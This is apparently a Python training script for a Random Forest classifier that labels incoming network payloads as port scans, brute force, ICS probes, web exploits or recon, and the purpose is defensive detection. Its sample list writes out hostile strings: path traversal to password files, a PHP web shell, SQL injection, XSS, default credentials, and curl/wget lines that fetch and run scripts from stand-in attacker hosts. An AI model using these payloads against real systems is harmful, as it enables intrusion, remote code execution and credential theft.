# train_model.py — Random Forest payload classifier training
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib
import numpy as np

# Curated attack samples for model training
TRAINING_DATA = [
    ("", "port_scan"), (" ", "port_scan"), ("GET / HTTP/1.0", "port_scan"),
    ("HEAD / HTTP/1.1", "port_scan"), ("\x00", "port_scan"),
    ("OPTIONS * HTTP/1.1", "port_scan"), ("\r\n", "port_scan"),
    ("HELP\r\n", "port_scan"), ("QUIT\r\n", "port_scan"), ("VERSION\r\n", "port_scan"),

    ("USER admin\r\nPASS admin123", "brute_force"),
    ("USER root\r\nPASS password", "brute_force"),
    ("USER administrator\r\nPASS 123456", "brute_force"),
    ("login: admin password: admin", "brute_force"),
    ("POST /login username=admin&password=test", "brute_force"),
    ("AUTH admin password123", "brute_force"),
    ("USER guest\r\nPASS guest", "brute_force"),
    ("root:password", "brute_force"), ("admin admin", "brute_force"),
    ("USER ftp\r\nPASS ftp", "brute_force"),
    ("authenticate username=operator password=scada", "brute_force"),
    
    ("\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0A", "ics_probe"),
    ("READ COILS modbus unit 1", "ics_probe"),
    ("modbus write register 40001", "ics_probe"),
    ("SCADA GET STATUS", "ics_probe"), ("DNP3 control command", "ics_probe"),
    ("enip list identity", "ics_probe"), ("BACnet read property", "ics_probe"),
    ("modbus read holding registers", "ics_probe"),
    
    ("GET /../../../etc/passwd HTTP/1.1", "web_exploit"),
    ("GET /admin/../../../etc/shadow", "web_exploit"),
    ("POST /upload <?php exec($_GET['cmd']); ?>", "web_exploit"),
    ("GET /search?q=' OR 1=1 --", "web_exploit"),
    ("GET /page?id=1 UNION SELECT username,password FROM users", "web_exploit"),
    ("<script>alert('xss')</script>", "web_exploit"),
    ("wget http://malware.site/shell.sh", "web_exploit"),
    ("curl http://evil.com/payload | bash", "web_exploit"),
    ("POST /api exec(base64_decode('...'))", "web_exploit"),
    
    ("SYST\r\n", "recon"), ("FEAT\r\n", "recon"),
    ("GET /robots.txt HTTP/1.1", "recon"), ("GET /.env HTTP/1.1", "recon"),
    ("GET /wp-admin/ HTTP/1.1", "recon"), ("GET /phpmyadmin/ HTTP/1.1", "recon"),
    ("GET /admin HTTP/1.1", "recon"), ("GET /config.php HTTP/1.1", "recon"),
    ("NMAP service detection probe", "recon"), ("banner grab attempt", "recon"),
]

def train():
    payloads = [item[0] for item in TRAINING_DATA]
    labels   = [item[1] for item in TRAINING_DATA]
    
    print(f"[ML] Training on {len(payloads)} samples")
    
    # Configure TF-IDF vectorization
    vectorizer = TfidfVectorizer(
        analyzer='char_wb',
        ngram_range=(2, 4),
        max_features=1000,
        min_df=1
    )
    
    X = vectorizer.fit_transform(payloads)
    y = np.array(labels)
    
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42
    )
    
    model = RandomForestClassifier(
        n_estimators=100,
        random_state=42,
        max_depth=10
    )
    model.fit(X_train, y_train)
    
    y_pred = model.predict(X_test)
    print("\n[ML] Classification Report:")
    print(classification_report(y_test, y_pred, zero_division=0))
    
    save_path = os.path.join(os.path.dirname(__file__), 'model.pkl')
    joblib.dump({'model': model, 'vectorizer': vectorizer}, save_path)
    print(f"\n[ML] Model saved: {save_path}")

if __name__ == '__main__':
    train()